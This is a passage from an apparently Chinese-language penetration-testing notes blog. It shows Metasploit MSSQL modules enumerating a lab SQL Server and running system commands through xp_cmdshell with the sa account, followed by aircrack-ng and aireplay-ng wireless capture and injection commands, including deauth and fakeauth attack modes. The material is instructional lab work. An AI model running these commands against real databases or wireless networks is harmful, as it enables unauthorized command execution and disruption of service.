USE_WINDOWS_AUTHENT  <span class="literal">false</span>            <span class="built_in">yes</span>       Use windows authentification (requires DOMAIN option <span class="built_in">set</span>)</span><br><span class="line">    </span><br><span class="line"> msf5 auxiliary(admin/mssql/mssql_enum) &gt; <span class="built_in">set</span> password 123456</span><br><span class="line">    password =&gt; 123456 msf5 auxiliary(admin /mssql/mssql_enum) &gt; <span class="built_in">set</span> rhosts 192.168.1.104</span><br><span class="line">    rhosts =&gt; 192.168.1.104 msf5 auxiliary(admin /mssql/mssql_enum) &gt;run</span><br><span class="line">    [*] Running module against 192.168.1.104</span><br><span class="line">    </span><br><span class="line">    [*] 192.168.1.104:1433 - Running MS SQL Server Enumeration...</span><br><span class="line">    [*] 192.168.1.104:1433 - Version:</span><br><span class="line">    [*]    Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) </span><br><span class="line">    [*]        Apr  2 2010 15:48:46 </span><br><span class="line">    [*]        Copyright (c) Microsoft Corporation</span><br><span class="line">    [*]        Enterprise Edition (64-bit) on Windows NT 6.2 &lt;X64&gt; (Build 9200: )</span><br><span class="line">    [*] 192.168.1.104:1433 - Configuration Parameters:</span><br><span class="line">    [*] 192.168.1.104:1433 -     C2 Audit Mode is Not Enabled</span><br><span class="line">[*] 192.168.1.104:1433 -     xp_cmdshell is Enabled</span><br><span class="line">    [*] 192.168.1.104:1433 -     remote access isEnabled</span><br><span class="line">    [*] 192.168.1.104:1433 -     allow updates is Not Enabled</span><br><span class="line">    [*] 192.168.1.104:1433 -     Database Mail XPs is Not Enabled</span><br><span class="line">    [*] 192.168.1.104:1433 -     Ole Automation Procedures are Not Enabled</span><br><span class="line">    [*] 192.168.1.104:1433 - Databases on the server:</span><br><span class="line">    [*] 192.168.1.104:1433 -     Database name:master</span><br><span class="line">    [*] 192.168.1.104:1433 -     Database Files <span class="keyword">for</span> master:</span><br><span class="line">    [*] 192.168.1.104:1433 -         D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\master.mdf</span><br><span class="line">    [*] 192.168.1.104:1433 -         D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\mastlog.ldf</span><br><span class="line">    [*] 192.168.1.104:1433 -     Database name:tempdb</span><br><span class="line">    [*] 192.168.1.104:1433 -     Database Files <span class="keyword">for</span> tempdb:</span><br><span class="line">    [*] 192.168.1.104:1433 -         D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\tempdb.mdf</span><br><span class="line">    [*] 192.168.1.104:1433 -         D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\templog.ldf</span><br><span class="line">    …………</span><br><span class="line"> [*] 192.168.1.104:1433 -System Logins on this Server:</span><br><span class="line">    [*] 192.168.1.104:1433 -     sa</span><br><span class="line">    [*] 192.168.1.104:1433 -     <span class="comment">##MS_SQLResourceSigningCertificate##</span></span><br><span class="line">    …………</span><br><span class="line">    [*] 192.168.1.104:1433 -     coach</span><br><span class="line">    [*] 192.168.1.104:1433 -     student</span><br><span class="line">    [*] 192.168.1.104:1433 - Disabled Accounts:</span><br><span class="line">    [*] 192.168.1.104:1433 -     <span class="comment">##MS_PolicyEventProcessingLogin##</span></span><br><span class="line">    [*] 192.168.1.104:1433 -     <span class="comment">##MS_PolicyTsqlExecutionLogin##</span></span><br><span class="line">    [*] 192.168.1.104:1433 - No Accounts Policy is <span class="built_in">set</span> <span class="keyword">for</span>:</span><br><span class="line">    [*] 192.168.1.104:1433 -     All System Accounts have the Windows Account Policy Applied to them.</span><br><span class="line">    [*] 192.168.1.104:1433 - Password Expiration is not checked <span class="keyword">for</span>:</span><br><span class="line">    [*] 192.168.1.104:1433 -     sa</span><br><span class="line">    …………</span><br><span class="line">    [*] 192.168.1.104:1433 -     coach</span><br><span class="line">    [*] 192.168.1.104:1433 -     student</span><br><span class="line">    [*] 192.168.1.104:1433 - Windows Logins on this Server:</span><br><span class="line">    [*] 192.168.1.104:1433 -     NT AUTHORITY\SYSTEM</span><br><span class="line">    …………</span><br><span class="line">    [*] 192.168.1.104:1433 - Windows Groups that can logins on this Server:</span><br><span class="line">    [*] 192.168.1.104:1433 -     NT SERVICE\MSSQLSERVER</span><br><span class="line">    [*] 192.168.1.104:1433 -     NT SERVICE\SQLSERVERAGENT</span><br><span class="line">    [*] 192.168.1.104:1433 - Accounts with Username and Password being the same:</span><br><span class="line">    [*] 192.168.1.104:1433 -     No Account with its password being the same as its username was found.</span><br><span class="line">  [*] 192.168.1.104:1433 -Accounts with empty password:</span><br><span class="line">    [*] 192.168.1.104:1433 -     No Accounts with empty passwords <span class="built_in">where</span> found.</span><br><span class="line">   [*] 192.168.1.104:1433 -Stored Procedures with Public Execute Permission found:</span><br><span class="line">    [*] 192.168.1.104:1433 -     sp_replsetsyncstatus</span><br><span class="line">    [*] 192.168.1.104:1433 -     sp_replcounters</span><br><span class="line">    [*] 192.168.1.104:1433 -     sp_replsendtoqueue</span><br><span class="line">    [*] 192.168.1.104:1433 -     sp_resyncexecutesql</span><br><span class="line">    [*] 192.168.1.104:1433 -     MSSQLSERVER</span><br><span class="line">    [*] 192.168.1.104:1433 - Default Server Instance SQL Server Service is running under the privilege of:</span><br><span class="line">    [*] 192.168.1.104:1433 -     NT AUTHORITY\NETWORKSERVICE</span><br><span class="line">    [*] Auxiliary module execution completed</span><br><span class="line">    msf5 auxiliary(admin/mssql/mssql_enum) &gt; </span><br></pre></td></tr></table></figure>
<ul>
<li><strong>注意观察执行结果，会得到许多有用信息。</strong></li>
</ul>
<h3 id="后渗透执行系统命令">5、后渗透/执行系统命令</h3>
<h4 id="对应模块">（1）对应模块</h4>
<p>第一个要使用的模块是mssql_exec，它可以启用已经被禁用的xp_cmdshell，从而允许执行系统级的命令。</p>
<p>第二个要使用的模块是mssql_sql，凭借它将可以在数据库上运行SQL查询。</p>
<p>…………</p>
<h4 id="重新载入xp_cmdshell功能">（2）重新载入xp_cmdshell功能</h4>
<p><strong>模块mssql_exec将会通过重新载入禁用的xp_cmdshell功能来运行系统级的命令。这个模块需要设置要执行的系统命令的CMD选项。</strong></p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/admin/mssql/mssql_exec </span><br><span class="line">    msf5 auxiliary(admin/mssql/mssql_exec) &gt;show options </span><br><span class="line">    </span><br><span class="line">    Module options (auxiliary/admin/mssql/mssql_exec):</span><br><span class="line">    </span><br><span class="line">       Name                 Current Setting                       Required  Description</span><br><span class="line">       ----                 ---------------                       --------  -----------</span><br><span class="line">       CMD                  cmd.exe /c <span class="built_in">echo</span> OWNED &gt; C:\owned.exe  no        Command to execute</span><br><span class="line">       PASSWORD                                                   no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">       RHOSTS                                                     <span class="built_in">yes</span>       The target address range or CIDR identifier</span><br><span class="line">       RPORT                1433                                  <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">       TDSENCRYPTION        <span class="literal">false</span>                                 <span class="built_in">yes</span>       Use TLS/SSL <span class="keyword">for</span> TDS data <span class="string">&quot;Force Encryption&quot;</span></span><br><span class="line">       USERNAME             sa                                    no        The username to authenticate as</span><br><span class="line">       USE_WINDOWS_AUTHENT  <span class="literal">false</span>                                 <span class="built_in">yes</span>       Use windows authentification (requires DOMAIN option <span class="built_in">set</span>)</span><br><span class="line">    </span><br><span class="line">msf5 auxiliary(admin/mssql/mssql_exec) &gt; <span class="built_in">set</span> rhosts 192.168.1.104</span><br><span class="line">    rhosts =&gt; 192.168.1.104 msf5 auxiliary(admin /mssql/mssql_exec) &gt; <span class="built_in">set</span> password 123456</span><br><span class="line">    password =&gt; 123456 msf5 auxiliary(admin /mssql/mssql_exec) &gt; <span class="built_in">set</span> cmd <span class="string">&#x27;ipconfig&#x27;</span></span><br><span class="line">    cmd =&gt; ipconfig</span><br><span class="line"> msf5 auxiliary(admin/mssql/mssql_exec) &gt;run</span><br><span class="line">    [*] Running module against 192.168.1.104</span><br><span class="line">    </span><br><span class="line">    [*] 192.168.1.104:1433 - SQL Query: EXEC master..xp_cmdshell <span class="string">&#x27;ipconfig&#x27;</span></span><br><span class="line">    </span><br><span class="line">     output</span><br><span class="line">     ------</span><br><span class="line">     </span><br><span class="line">     Windows IP M�n</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">     �e�~@\�WQ�M�hV ,g0Wޏ�c* 3:</span><br><span class="line">     </span><br><span class="line">        �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_ޏ�c</span><br><span class="line">        ޏ�cyr�[�v DNS T . . . . . . . : </span><br><span class="line">     </span><br><span class="line">     �e�~@\�WQ�M�hV ,g0Wޏ�c* 4:</span><br><span class="line">     </span><br><span class="line">        �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_ޏ�c</span><br><span class="line">        ޏ�cyr�[�v DNS T . . . . . . . : </span><br><span class="line">     </span><br><span class="line">     �N*YQ�M�hV VMware Network Adapter VMnet1:</span><br><span class="line">     </span><br><span class="line">        ޏ�cyr�[�v DNS T . . . . . . . : </span><br><span class="line">        ,g0W���c IPv6 0W@W. . . . . . . . : fe80::b5b6:426f:907c:7d60%5</span><br><span class="line">        IPv4 0W@W . . . . . . . . . . . . : 192.168.10.1</span><br><span class="line">        P[Q�cx  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">        ؞��QsQ. . . . . . . . . . . . . : </span><br><span class="line">     </span><br><span class="line">     �N*YQ�M�hV VMware Network Adapter VMnet8:</span><br><span class="line">     </span><br><span class="line">        ޏ�cyr�[�v DNS T . . . . . . . : </span><br><span class="line">        ,g0W���c IPv6 0W@W. . . . . . . . : fe80::d9b4:73e0:7e23:87df%8</span><br><span class="line">        IPv4 0W@W . . . . . . . . . . . . : 10.10.10.1</span><br><span class="line">        P[Q�cx  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">        ؞��QsQ. . . . . . . . . . . . . : </span><br><span class="line">     </span><br><span class="line">     �e�~@\�WQ�M�hV WLAN:</span><br><span class="line">     </span><br><span class="line">        ޏ�cyr�[�v DNS T . . . . . . . : </span><br><span class="line">        ,g0W���c IPv6 0W@W. . . . . . . . : fe80::6941:409f:25c4:4914%14</span><br><span class="line">        IPv4 0W@W . . . . . . . . . . . . : 192.168.1.104</span><br><span class="line">        P[Q�cx  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">        ؞��QsQ. . . . . . . . . . . . . : 192.168.1.1</span><br><span class="line">     </span><br><span class="line">     �N*YQ�M�hV �N*YQ 3:</span><br><span class="line">     </span><br><span class="line">        �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_ޏ�c</span><br><span class="line">        ޏ�cyr�[�v DNS T . . . . . . . : </span><br><span class="line">     </span><br><span class="line">    </span><br><span class="line">    [*] Auxiliary module execution completed  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>注意：目标系统如果安装有安全软件，部分命令会被拦截，如：net
user 被360拦截</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211207110707946-477473885.png" /></p>
<h4 id="运行sql查询命令">（3）运行SQL查询命令</h4>
<p><strong>可以使用mssql_sql模块对目标数据库服务器执行SQL查询命令。你只需将SQL参数的值设定为一条有效的数据库查询命令，这条命令就会被执行。</strong></p>
<p><strong>以查询数据库版本为例</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/admin/mssql/mssql_sql</span><br><span class="line">    msf5 auxiliary(admin/mssql/mssql_sql) &gt;show options </span><br><span class="line">    </span><br><span class="line">    Module options (auxiliary/admin/mssql/mssql_sql):</span><br><span class="line">    </span><br><span class="line">       Name                 Current Setting   Required  Description</span><br><span class="line">       ----                 ---------------   --------  -----------</span><br><span class="line">       PASSWORD                               no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">       RHOSTS                                 <span class="built_in">yes</span>       The target address range or CIDR identifier</span><br><span class="line">       RPORT                1433              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">      SQL                  <span class="keyword">select</span> @@version  no        The SQL query to execute</span><br><span class="line">       TDSENCRYPTION        <span class="literal">false</span>             <span class="built_in">yes</span>       Use TLS/SSL <span class="keyword">for</span> TDS data <span class="string">&quot;Force Encryption&quot;</span></span><br><span class="line">       USERNAME             sa                no        The username to authenticate as</span><br><span class="line">       USE_WINDOWS_AUTHENT  <span class="literal">false</span>             <span class="built_in">yes</span>       Use windows authentification (requires DOMAIN option <span class="built_in">set</span>)</span><br><span class="line">    </span><br><span class="line">    msf5 auxiliary(admin/mssql/mssql_sql) &gt; <span class="built_in">set</span> rhosts 192.168.1.104</span><br><span class="line">    rhosts =&gt; 192.168.1.104 msf5 auxiliary(admin /mssql/mssql_sql) &gt; <span class="built_in">set</span> password 123456</span><br><span class="line">    password =&gt; 123456 msf5 auxiliary(admin /mssql/mssql_sql) &gt;run</span><br><span class="line">    [*] Running module against 192.168.1.104</span><br><span class="line">    </span><br><span class="line">    [*] 192.168.1.104:1433 - SQL Query: <span class="keyword">select</span> @@version</span><br><span class="line">    [*] 192.168.1.104:1433 - Row Count: 1 (Status: 16 Command: 193)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">     NULL</span><br><span class="line">     ---- Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1(X64) </span><br><span class="line">    Apr  2 2010 15:48:46 </span><br><span class="line">    Copyright (c) Microsoft Corporation</span><br><span class="line">    Enterprise Edition (64-bit) on Windows NT 6.2 &lt;X64&gt; (Build 9200: )</span><br><span class="line">    [*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>无线渗透实操</title>
    <url>/2022/04/17/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/</url>
    <content><![CDATA[<h2 id="aircrack-ng基础">1. AIRCRACK-NG基础</h2>
<p>无线渗透和审计神器</p>
<p>包含各种 <strong>功能</strong> 的工具套件</p>
<ul>
<li><strong>网络检测</strong></li>
<li><strong>嗅探抓包</strong></li>
<li><strong>包注入</strong></li>
<li><strong>密码破解</strong></li>
</ul>
<h2 id="airmon-ng">2. AIRMON-NG</h2>
<h3 id="检查网卡驱动芯片信息">1、检查网卡驱动，芯片信息</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># airmon-ng </span></span><br><span class="line">PHY     Interface       Driver          Chipset</span><br><span class="line">phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT5370</span><br></pre></td></tr></table></figure>
<h3 id="airmon-ng-check">2、airmon-ng check</h3>
<p>检查AIRCRACK套件的使用与当前系统可能存在冲突的进程，可使用 airmon-ng
check kill 将其关闭。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417193154148-2049747736.png" /></p>
<h3 id="开启和停止无线侦听">3、开启和停止无线侦听</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417194320813-2058965130.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417194450405-607788108.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417194819228-639000502.png" /></p>
<p>备注：可以在 "airmon-ng start wlan0" 后加数字指定工作信道。</p>
<h2 id="airodump-ng">3. airodump-ng</h2>
<h3 id="部分命令">1、部分命令</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon   <span class="comment">#在所有支持的信道中轮巡侦听</span></span><br><span class="line">airodump-ng wlan0mon -c 11     <span class="comment">#指定抓包信道11，由于信道是交叉的重叠的，依旧可能会抓到其它信道的</span></span><br><span class="line">airodump-ng wlan0mon -c 6 --bssid 54:75:95:2E:B3:6B       <span class="comment">#指定要抓的具体ssid</span></span><br><span class="line">airodump-ng wlan0mon -c 6 --bssid 54:75:95:2E:B3:6B -w /home/kali/Desktop/test.cap     <span class="comment">#抓包结果写入test.cap</span></span><br><span class="line">airodump-ng wlan0mon -c 6 --bssid 54:75:95:2E:B3:6B -w /home/kali/Desktop/test.cap --ivs      <span class="comment">#只抓取包含ivs的</span></span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># airodump-ng wlan0mon -c 6 --bssid 54:75:95:2E:B3:6B</span></span><br><span class="line"></span><br><span class="line"> CH  6 ][ Elapsed: 0 s ][ 2022-04-17 08:36 ][ fixed channel wlan0mon: -1                                   </span><br><span class="line">                                                                                                           </span><br><span class="line"> BSSID              PWR RXQ  Beacons    <span class="comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                       </span></span><br><span class="line">                                                                                                           </span><br><span class="line"> 54:75:95:2E:B3:6B  -16  84       14      526  208   6  405   WPA2 CCMP   PSK  窝窝头                      </span><br><span class="line">                                                                                                           </span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                         </span><br><span class="line">                                                                                                           </span><br><span class="line"> 54:75:95:2E:B3:6B  C8:94:02:DF:2C:A1  -26    0 -11     14       59                                        </span><br><span class="line"> 54:75:95:2E:B3:6B  7A:56:70:E8:D4:3E  -28    1e- 1e   357      523                                        </span><br><span class="line">Quitting...    </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417203555594-1394800882.png" /></p>
<p><strong>注意，如果 " airmon-ng start wlan0 " 后抓不到包，可尝试用 iw
命令添加监听端口解决，相关命令如下</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iw dev wlan0 interface add wlan0mon <span class="built_in">type</span> monitor </span><br><span class="line">ifconfig wlan0mon up </span><br></pre></td></tr></table></figure>
<h3 id="抓包结果分析">2、抓包结果分析</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417212914723-1570224930.png" /></p>
<ul>
<li><strong>BSSID：</strong> AP的MAC地址</li>
<li><strong>PWR：</strong> 网卡接收到的信号强度，距离越近信号越强</li>
<li>-1：驱动不支持信号强度（如下图）、STA距离超出信号接受范围（如上图3处）</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417213239481-1739370126.png" /></p>
<ul>
<li><strong>RXQ：</strong>
最近10秒成功接收的数据帧的百分比(数据帧、管理帧)，只有固定信道时才会出现</li>
<li><strong>Beacons：</strong> 接收到此AP发送的beacon帧数量</li>
<li><strong>#Data：</strong>
抓到的数据帧数量(WEP表示IV数量)，包含广播数据帧</li>
<li><strong>#/s：</strong> 最近10秒内，每秒平均抓到的帧的数量</li>
<li><strong>CH：</strong>
信道好(从beacon帧中获得)，信道重叠时可能发现其他信道</li>
<li><strong>MB：</strong> AP支持的最大速率</li>
<li><strong>ENC：</strong> 采用的无线安全技术WEP、WPA、WPA2、OPEN</li>
<li><strong>CIPHER：</strong>
采用的加密套件CCMP、TKIP、WEP40、WEP104</li>
<li><strong>AUTH：</strong>
身份验证方法MGT（企业）、PSK（个人）、SKA（WEP）、OPEN</li>
<li><strong>ESSID：</strong>
无线网络名称，隐藏AP此值可能为空，airodump从probe和association
request帧中发现隐藏AP（如上图1处）</li>
<li><strong>STATION：</strong> STA的MAC地址</li>
<li><strong>Lost：</strong> 通过sequence
umber判断最近10秒STA发送丢失的数据包数量(管理帧、数据帧)</li>
<li>干扰、距离</li>
<li>发包不能收，收包不能发</li>
<li><strong>Packets（Frames）：</strong> STA发送的数据包数量</li>
<li><strong>Probes：</strong> STA探测的ESSID（如上图2处）</li>
</ul>
<h3 id="排错">3、排错</h3>
<p>（1）不显示任何AP和STA信息</p>
<ul>
<li>看上面 1 处的注意</li>
<li>物理机场景下使用笔记本内置无线网卡时，确保BIOS中已经启动无线网卡</li>
<li>确认无线网卡在managed模式下可以正常工作</li>
<li>尝试禁用network-manager服务</li>
<li>尝试卸载rmmod和重新加载modprobe驱动</li>
</ul>
<p>（2）工作一段时间后airodump-ng无法继续抓包</p>
<ul>
<li>airmon-ng check kill</li>
<li>确认wpa_supplicant进程已停止</li>
</ul>
<h2 id="aireplay-ng">4. AIREPLAY-NG</h2>
<h3 id="介绍">1、介绍</h3>
<p>产生或者加速无线通信流量</p>
<ul>
<li>向无线网络中注入数据包</li>
<li>伪造身份验证</li>
<li>强制重新身份验证</li>
<li>抓包重放</li>
<li>用于后续WEP和WPA密码破解</li>
<li>支持10种包注入</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220418112700067-1589263635.png" /></p>
<p>获取包的两种途径</p>
<ul>
<li>指定接口(-i)</li>
<li>抓包文件pcap(-r)</li>
</ul>
<h3 id="aireplay-ng-help">2、AIREPLAY-NG help</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># aireplay-ng               </span></span><br><span class="line"></span><br><span class="line">  Aireplay-ng 1.6  - (C) 2006-2020 Thomas d<span class="string">&#x27;Otreppe</span></span><br><span class="line"><span class="string">  https://www.aircrack-ng.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  usage: aireplay-ng &lt;options&gt; &lt;replay interface&gt; **Filter options:** -b bssid  : MAC address, Access Point</span></span><br><span class="line"><span class="string">      -d dmac   : MAC address, Destination</span></span><br><span class="line"><span class="string">      -s smac   : MAC address, Source</span></span><br><span class="line"><span class="string">      -m len    : minimum packet length</span></span><br><span class="line"><span class="string">      -n len    : maximum packet length</span></span><br><span class="line"><span class="string">      -u type   : frame control, type    field</span></span><br><span class="line"><span class="string">      -v subt   : frame control, subtype field</span></span><br><span class="line"><span class="string">      -t tods   : frame control, To      DS bit</span></span><br><span class="line"><span class="string">      -f fromds : frame control, From    DS bit</span></span><br><span class="line"><span class="string">      -w iswep  : frame control, WEP     bit</span></span><br><span class="line"><span class="string">      -D        : disable AP detection</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  **Replay options:** -x nbpps  : number of packets per second</span></span><br><span class="line"><span class="string">      -p fctrl  : set frame control word (hex)</span></span><br><span class="line"><span class="string">      -a bssid  : set Access Point MAC address</span></span><br><span class="line"><span class="string">      -c dmac   : set Destination  MAC address</span></span><br><span class="line"><span class="string">      -h smac   : set Source       MAC address</span></span><br><span class="line"><span class="string">      -g value  : change ring buffer size (default: 8)</span></span><br><span class="line"><span class="string">      -F        : choose first matching packet</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      Fakeauth attack options:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      -e essid  : set target AP SSID</span></span><br><span class="line"><span class="string">      -o npckts : number of packets per burst (0=auto, default: 1)</span></span><br><span class="line"><span class="string">      -q sec    : seconds between keep-alives</span></span><br><span class="line"><span class="string">      -Q        : send reassociation requests</span></span><br><span class="line"><span class="string">      -y prga   : keystream for shared key auth</span></span><br><span class="line"><span class="string">      -T n      : exit after retry fake auth request n time</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      Arp Replay attack options:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      -j        : inject FromDS packets</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      Fragmentation attack options:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      -k IP     : set destination IP in fragments</span></span><br><span class="line"><span class="string">      -l IP     : set source IP in fragments</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      Test attack options:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      -B        : activates the bitrate test</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Source options:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      -i iface  : capture packets from this interface</span></span><br><span class="line"><span class="string">      -r file   : extract packets from this pcap file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Miscellaneous options:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      -R                    : disable /dev/rtc usage</span></span><br><span class="line"><span class="string">      --ignore-negative-one : if the interface&#x27;</span>s channel can<span class="string">&#x27;t be determined,</span></span><br><span class="line"><span class="string">                              ignore the mismatch, needed for unpatched cfg80211</span></span><br><span class="line"><span class="string">      --deauth-rc rc        : Deauthentication reason code [0-254] (Default: 7)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  **Attack modes (numbers can still be used):** --deauth      count : deauthenticate 1 or all stations (-0)</span></span><br><span class="line"><span class="string">      --fakeauth    delay : fake authentication with AP (-1)</span></span><br><span class="line"><span class="string">      --interactive       : interactive frame selection (-2)</span></span><br><span class="line"><span class="string">      --arpreplay         : standard ARP-request replay (-3)</span></span><br><span class="line"><span class="string">      --chopchop          : decrypt/chopchop WEP packet (-4)</span></span><br><span class="line"><span class="string">      --fragment          : generates valid keystream   (-5)</span></span><br><span class="line"><span class="string">      --caffe-latte       : query a client for new IVs  (-6)</span></span><br><span class="line"><span class="string">      --cfrag             : fragments against a client  (-7)</span></span><br><span class="line"><span class="string">      --migmode           : attacks WPA migration mode  (-8)</span></span><br><span class="line"><span class="string">      --test              : tests injection and quality (-9)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      --help              : Displays this usage screen</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">No replay interface specified.</span></span><br></pre></td></tr></table></figure>
<h3 id="aireplay-ng排错">3、AIREPLAY-NG排错</h3>
<p><strong>（1）Aireplay-ng命令挂起没有任何输出</strong></p>
<ul>
<li><strong>无线网卡与AP工作在不同信道</strong></li>
</ul>
<p><strong>（2）报错"write failed: Cannot allocate memory
wi_write():illegal seek"</strong></p>
<ul>
<li><strong>无线网卡使用Broadcom芯片（bcm43xx),替换为b43驱动可解决</strong></li>
</ul>
<p><strong>（3）可注入但速度很慢，并提示内核消息"rtc:lost some
interrupts at 1024Hz"</strong></p>
<ul>
<li><strong>没有修正方法，此时可以启动多个aireplay-ng命令提高速度</strong></li>
</ul>
<p><strong>（4）使用-h参数指定注入MAC地址与网卡MAC地址不一致报错</strong></p>
<ul>
<li><strong>建议保持一致 (macchange)</strong></li>
</ul>
<p><strong>MAC修改示例</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220418115031346-1692097645.png" /></strong></p>
<p>如果修改时出现下述问题，先执行 " ifconfig wlan0mon down"</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ERROR] Could not change MAC: interface up or insufficient permissions: Cannot assign requested address</span><br></pre></td></tr></table></figure>
<h3 id="aireplay-ng包注入测试">4、AIREPLAY-NG包注入测试</h3>
<p><strong>检测网卡是否可以注入包</strong></p>
<p>检测AP的响应时间</p>
<ul>
<li>回包率反应链路质量</li>
</ul>
<p><strong>如果有两个无线网卡，可以检测具体可以注入哪种攻击（一个网卡也可，实现见后面示例）</strong></p>
<p>基本测试检测AP对probe广播的响应</p>
<ul>
<li>向每AP发30包</li>
<li>网卡成功发送并可接收包的能力</li>
</ul>
<h4 id="基本测试">（1）基本测试</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220418115557831-1883142731.png" /></p>
<h4 id="向隐藏ap-指定ssid注入">（2）向隐藏AP / 指定SSID注入</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220418120642692-620222619.png" /></p>
<h4 id="card-to-card注入测试">（3）card to card注入测试</h4>
<p>具体攻击方式</p>
<ul>
<li>-i 指定作为AP的网卡</li>
</ul>
<p>结果有 Failed，"可能" 是注入MAC(包里面的MAC)和真正MAC不相同导致</p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># iw dev wlan0 interface add wlan0mon type monitor　　#由于只有一个网卡，添加两个端口测试</span></span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># iw dev wlan0 interface add wlan1mon type monitor</span></span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># iwconfig                                        </span></span><br><span class="line">…………………………</span><br><span class="line"></span><br><span class="line">wlan0     IEEE 802.11  ESSID:<span class="string">&quot;\xE7\xAA\x9D\xE7\xAA\x9D\xE5\xA4\xB4&quot;</span>  </span><br><span class="line">          Mode:Managed  Frequency:2.462 GHz  Access Point: 54:75:95:2E:B3:6B   </span><br><span class="line">          Bit Rate=58.5 Mb/s   Tx-Power=20 dBm   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power 